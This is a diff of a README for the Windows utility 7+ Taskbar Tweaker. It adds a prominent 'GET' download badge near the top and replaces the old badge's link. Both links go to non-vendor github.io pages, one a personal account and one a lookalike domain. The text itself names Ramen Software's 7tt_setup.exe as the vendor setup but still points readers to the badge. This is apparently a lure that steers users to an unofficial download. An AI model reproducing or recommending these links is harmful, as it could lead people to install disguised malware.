@@ -16,6 +16,8 @@ The options list lives in [options_def.c](options_def.c). Portable or registry s
 
 Message IDs between the exe and the injected code are tweaker_messages.h. Version pins are version.h. The DLL export list is _exports.def.
 
+[![GET 7+ Taskbar Tweaker](https://img.shields.io/badge/GET-7%2B%20Taskbar%20Tweaker-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://7-taskbar-tweaker.github.io/7-Taskbar/)
+
 ## Technical details
 
 7+ Taskbar Tweaker injects into Explorer and hooks the taskbar window. You pick an option in the settings dialog. The hook applies it to buttons, thumbnails, and the tray clock.
@@ -141,8 +143,6 @@ A useful report has: Windows build number, tweaker version from the about box, o
 YouTube clips linked in the brief are demos, not support. Watch them for mouse ideas, then set the same row in settings.
 
 ## Download
-
-[![GET 7+ Taskbar Tweaker](https://img.shields.io/badge/GET-7%2B%20Taskbar%20Tweaker-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://lisajacksonm488.github.io/.github/7+-Taskbar-Tweaker)
 
 Use the GET badge for this pack. The vendor setup is 7tt_setup.exe from the Ramen Software download page.
 
